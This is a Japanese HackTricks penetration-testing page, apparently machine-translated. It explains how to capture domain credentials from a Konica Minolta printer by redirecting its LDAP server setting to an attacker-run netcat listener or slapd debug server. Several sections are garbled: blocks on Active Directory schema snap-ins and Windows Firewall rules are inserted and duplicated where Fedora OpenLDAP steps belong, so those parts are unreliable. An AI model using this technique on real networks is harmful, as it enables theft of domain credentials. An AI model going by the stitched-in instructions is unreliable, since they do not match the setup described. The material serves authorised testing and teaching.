<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください**。

</details>


**LDAPのデフォルト/弱い**ログオン資格情報で構成されたプリンタを残す危険性を強調する**いくつかのブログ**がインターネット上にあります。\
これは、攻撃者がプリンタを**偽のLDAPサーバに認証**させる（通常は`nc -vv -l -p 444`で十分）ことができ、プリンタの**資格情報を平文でキャプチャ**する可能性があるためです。

また、いくつかのプリンタには**ユーザ名のログ**が含まれているか、ドメインコントローラから**すべてのユーザ名をダウンロード**することができる場合もあります。

これらの**機密情報**と一般的な**セキュリティの欠如**により、プリンタは攻撃者にとって非常に興味深いものとなります。

このトピックに関するいくつかのブログ：

* [https://www.ceos3c.com/hacking/obtaining-domain-credentials-printer-netcat/](https://www.ceos3c.com/hacking/obtaining-domain-credentials-printer-netcat/)
* [https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)

**以下の情報は**[**https://grimhacker.com/2018/03/09/just-a-printer/**](https://grimhacker.com/2018/03/09/just-a-printer/)からコピーされました。

# LDAPの設定

Konica Minoltaプリンタでは、LDAPサーバと認証に使用する資格情報を設定することができます。これらのデバイスのファームウェアの以前のバージョンでは、単にページのHTMLソースを読むことで資格情報を回復することができると聞いています。しかし、現在はインターフェースに資格情報は返されないため、少し手間がかかります。

LDAPサーバのリストは次の場所にあります：ネットワーク> LDAP設定> LDAPの設定

インターフェースでは、接続に使用される資格情報を再入力することなくLDAPサーバを変更することができます。これは、よりシンプルなユーザーエクスペリエンスのためのものだと思われますが、プリンタのマスターからドメイン上の足場にエスカレーションする機会を提供します。

LDAPサーバアドレス設定を制御するマシンに再構成し、便利な「テスト接続」機能をトリガーすることができます。

# グッズを聞く

## netcat

私よりも運が良ければ、単純なnetcatリスナーで済むかもしれません：
```
sudo nc -k -v -l -p 386
```
私は、[@\_castleinthesky](https://twitter.com/\_castleinthesky) によってこれがほとんどの場合機能すると保証されていますが、私はまだそれほど簡単には解決されていません。

## Slapd

プリンターは最初にヌルバインドを試み、その後利用可能な情報をクエリし、これらの操作が成功した場合にのみ資格情報でバインドします。したがって、完全なLDAPサーバーが必要です。

要件を満たすシンプルなLDAPサーバーを探しましたが、選択肢は限られているようでした。最終的に、OpenLDAPサーバーをセットアップし、slapdデバッグサーバーサービスを使用して接続を受け入れ、プリンターからのメッセージを出力することにしました。（もし簡単な代替案をご存知の場合は、教えていただけると嬉しいです）

### インストール

（このセクションは、こちらのガイドの軽く適応されたバージョンです：[https://www.server-world.info/en/note?os=Fedora\_26\&p=openldap](https://www.server-world.info/en/note?os=Fedora\_26\&p=openldap)）

rootターミナルから：

**OpenLDAPをインストールします。**
```
#> dnf install -y install openldap-servers openldap-clients

#> cp /usr/share/openldap-servers/DB_CONFIG.example /var/lib/ldap/DB_CONFIG

#> chown ldap. /var/lib/ldap/DB_CONFIG
```
**OpenLDAPの管理者パスワードを設定します（後で再度必要になります）**
```
#> slappasswd
New password:
Re-enter new password:
{SSHA}xxxxxxxxxxxxxxxxxxxxxxxx
```

```
#> vim chrootpw.ldif
# specify the password generated above for "olcRootPW" section
dn: olcDatabase={0}config,cn=config
changetype: modify
add: olcRootPW
olcRootPW: {SSHA}xxxxxxxxxxxxxxxxxxxxxxxx
```

```
#> ldapadd -Y EXTERNAL -H ldapi:/// -f chrootpw.ldif
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
modifying entry "olcDatabase={0}config,cn=config"
```
**基本スキーマのインポート**

```plaintext
To import basic Schemas, you can use the following command:

```powershell
regsvr32 /s schmmgmt.dll
```

This command will register the Active Directory Schema Management Snap-in, which allows you to manage the Active Directory schema.

Once the snap-in is registered, you can open the Active Directory Schema Management console by running the following command:

```powershell
mmc.exe
```

Then, go to `File -> Add/Remove Snap-in` and select `Active Directory Schema`. Click on `Add` and then `OK` to add the snap-in to the console.

Now, you can view and modify the Active Directory schema by expanding the `Active Directory Schema` node in the console.

Note: Importing basic Schemas requires administrative privileges.
```
```plaintext
基本スキーマをインポートするには、次のコマンドを使用します。

```powershell
regsvr32 /s schmmgmt.dll
```

このコマンドは、Active Directoryスキーマ管理スナップインを登録します。これにより、Active Directoryスキーマを管理することができます。

スナップインが登録されたら、次のコマンドを実行してActive Directoryスキーマ管理コンソールを開きます。

```powershell
mmc.exe
```

次に、`ファイル -> スナップインの追加/削除`に移動し、`Active Directoryスキーマ`を選択します。`追加`をクリックし、スナップインをコンソールに追加するために`OK`をクリックします。

これで、コンソール内の`Active Directoryスキーマ`ノードを展開して、Active Directoryスキーマを表示および変更することができます。

注意：基本スキーマのインポートには管理者権限が必要です。
```
```
#> ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/cosine.ldif
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
adding new entry "cn=cosine,cn=schema,cn=config"

#> ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/nis.ldif
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
adding new entry "cn=nis,cn=schema,cn=config"

#> ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/inetorgperson.ldif
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
adding new entry "cn=inetorgperson,cn=schema,cn=config"
```
**LDAP DB にドメイン名を設定します。**
```
# generate directory manager's password
#> slappasswd
New password:
Re-enter new password:
{SSHA}xxxxxxxxxxxxxxxxxxxxxxxx

#> vim chdomain.ldif
# specify the password generated above for "olcRootPW" section
dn: olcDatabase={1}monitor,cn=config
changetype: modify
replace: olcAccess
olcAccess: {0}to * by dn.base="gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth"
read by dn.base="cn=Manager,dc=foo,dc=bar" read by * none

dn: olcDatabase={2}mdb,cn=config
changetype: modify
replace: olcSuffix
olcSuffix: dc=foo,dc=bar

dn: olcDatabase={2}mdb,cn=config
changetype: modify
replace: olcRootDN
olcRootDN: cn=Manager,dc=foo,dc=bar

dn: olcDatabase={2}mdb,cn=config
changetype: modify
add: olcRootPW
olcRootPW: {SSHA}xxxxxxxxxxxxxxxxxxxxxxxx

dn: olcDatabase={2}mdb,cn=config
changetype: modify
add: olcAccess
olcAccess: {0}to attrs=userPassword,shadowLastChange by
dn="cn=Manager,dc=foo,dc=bar" write by anonymous auth by self write by * none
olcAccess: {1}to dn.base="" by * read
olcAccess: {2}to * by dn="cn=Manager,dc=foo,dc=bar" write by * read

#> ldapmodify -Y EXTERNAL -H ldapi:/// -f chdomain.ldif
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
modifying entry "olcDatabase={1}monitor,cn=config"

modifying entry "olcDatabase={2}mdb,cn=config"

modifying entry "olcDatabase={2}mdb,cn=config"

modifying entry "olcDatabase={2}mdb,cn=config"

modifying entry "olcDatabase={2}mdb,cn=config"

#> vim basedomain.ldif
dn: dc=foo,dc=bar
objectClass: top
objectClass: dcObject
objectclass: organization
o: Foo Bar
dc: DC1

dn: cn=Manager,dc=foo,dc=bar
objectClass: organizationalRole
cn: Manager
description: Directory Manager

dn: ou=People,dc=foo,dc=bar
objectClass: organizationalUnit
ou: People

dn: ou=Group,dc=foo,dc=bar
objectClass: organizationalUnit
ou: Group

#> ldapadd -x -D cn=Manager,dc=foo,dc=bar -W -f basedomain.ldif
Enter LDAP Password: # directory manager's password
adding new entry "dc=foo,dc=bar"

adding new entry "cn=Manager,dc=foo,dc=bar"

adding new entry "ou=People,dc=foo,dc=bar"

adding new entry "ou=Group,dc=foo,dc=bar"
```
**LDAP TLSの設定**

**SSL証明書の作成**
```
#> cd /etc/pki/tls/certs
#> make server.key
umask 77 ; \
/usr/bin/openssl genrsa -aes128 2048 > server.key
Generating RSA private key, 2048 bit long modulus
...
...
e is 65537 (0x10001)
Enter pass phrase: # set passphrase
Verifying - Enter pass phrase: # confirm

# remove passphrase from private key
#> openssl rsa -in server.key -out server.key
Enter pass phrase for server.key: # input passphrase
writing RSA key

#> make server.csr
umask 77 ; \
/usr/bin/openssl req -utf8 -new -key server.key -out server.csr
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [XX]: # country
State or Province Name (full name) []: # state
Locality Name (eg, city) [Default City]: # city
Organization Name (eg, company) [Default Company Ltd]: # company
Organizational Unit Name (eg, section) []:Foo Bar # department
Common Name (eg, your name or your server's hostname) []:www.foo.bar # server's FQDN
Email Address []:xxx@foo.bar # admin email
Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []: # Enter
An optional company name []: # Enter

#> openssl x509 -in server.csr -out server.crt -req -signkey server.key -days 3650
Signature ok
subject=/C=/ST=/L=/O=/OU=Foo Bar/CN=dlp.foo.bar/emailAddress=xxx@roo.bar
Getting Private key
```
**SSL / TLS のために Slapd を設定する**

To configure Slapd for SSL/TLS, follow the steps below:

1. Generate a self-signed certificate or obtain a certificate from a trusted Certificate Authority (CA).

2. Copy the certificate and private key files to the appropriate directory on the server. The default directory is usually `/etc/ldap/ssl/`.

3. Set the correct permissions for the certificate and private key files. The files should only be readable by the owner (root) and the LDAP server process.

4. Edit the Slapd configuration file, usually located at `/etc/ldap/slapd.conf` or `/etc/ldap/slapd.d/cn=config.ldif`.

5. Add the following lines to the configuration file:

   ```
   TLSCACertificateFile /etc/ldap/ssl/ca.crt
   TLSCertificateFile /etc/ldap/ssl/server.crt
   TLSCertificateKeyFile /etc/ldap/ssl/server.key
   ```

   Replace the file paths with the actual paths to your certificate and key files.

6. Save the configuration file and restart the Slapd service for the changes to take effect.

7. Test the SSL/TLS connection by using the `ldapsearch` command with the `-ZZ` option:

   ```
   ldapsearch -H ldap://localhost -ZZ -x -b "dc=example,dc=com" -D "cn=admin,dc=example,dc=com" -W
   ```

   Replace the LDAP server URL, base DN, and admin credentials with your own.

If the SSL/TLS configuration is successful, the `ldapsearch` command should return the LDAP entries without any errors.
```
#> cp /etc/pki/tls/certs/server.key \
/etc/pki/tls/certs/server.crt \
/etc/pki/tls/certs/ca-bundle.crt \
/etc/openldap/certs/

#> chown ldap. /etc/openldap/certs/server.key \
/etc/openldap/certs/server.crt \
/etc/openldap/certs/ca-bundle.crt

#> vim mod_ssl.ldif
# create new
dn: cn=config
changetype: modify
add: olcTLSCACertificateFile
olcTLSCACertificateFile: /etc/openldap/certs/ca-bundle.crt
-
replace: olcTLSCertificateFile
olcTLSCertificateFile: /etc/openldap/certs/server.crt
-
replace: olcTLSCertificateKeyFile
olcTLSCertificateKeyFile: /etc/openldap/certs/server.key

#> ldapmodify -Y EXTERNAL -H ldapi:/// -f mod_ssl.ldif
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
modifying entry "cn=config"
```
**ローカルファイアウォールを介してLDAPを許可する**

To allow LDAP through your local firewall, follow these steps:

1. Open the Windows Firewall settings on your local machine.
2. Click on "Advanced settings" to access the advanced configuration options.
3. In the left pane, select "Inbound Rules" and then click on "New Rule" in the right pane.
4. Choose the rule type as "Port" and click "Next".
5. Select "TCP" as the protocol and enter the specific port number for LDAP (default is 389). Click "Next".
6. Select "Allow the connection" and click "Next".
7. Choose the network location where this rule should apply (e.g., Domain, Private, Public). Click "Next".
8. Provide a name and description for the rule, and click "Finish" to complete the process.

By allowing LDAP through your local firewall, you will be able to establish connections to LDAP servers and access Active Directory information from printers and other devices on your network.
```
firewall-cmd --add-service={ldap,ldaps}
```
## ペイオフ

LDAPサービスをインストールして設定した後、次のコマンドで実行できます：

> ```
> slapd -d 2
> ```

以下のスクリーンショットは、プリンターで接続テストを実行した際の出力の例を示しています。LDAPクライアントからサーバーにユーザー名とパスワードが渡されていることがわかります。

![ユーザー名「MyUser」とパスワード「MyPassword」を含むslapdのターミナル出力](https://i1.wp.com/grimhacker.com/wp-content/uploads/2018/03/slapd\_output.png?resize=474%2C163\&ssl=1)

# どれくらい悪いことが起こる可能性があるのか？

これは設定された資格情報に大きく依存します。

最小特権の原則が守られている場合、Active Directoryの特定の要素に対して読み取りアクセスのみを取得することができるかもしれません。これは、さらに正確な攻撃を計画するための情報として依然として価値があります。

通常、Domain Usersグループのアカウントを取得することができ、これにより機密情報へのアクセスが可能になったり、他の攻撃の前提となる認証が可能になったりします。

また、私のようにLDAPサーバーを設定することで、Domain Adminアカウントが手渡されるかもしれません。

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手**したいですか？または、**HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローしてください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。**

</details>
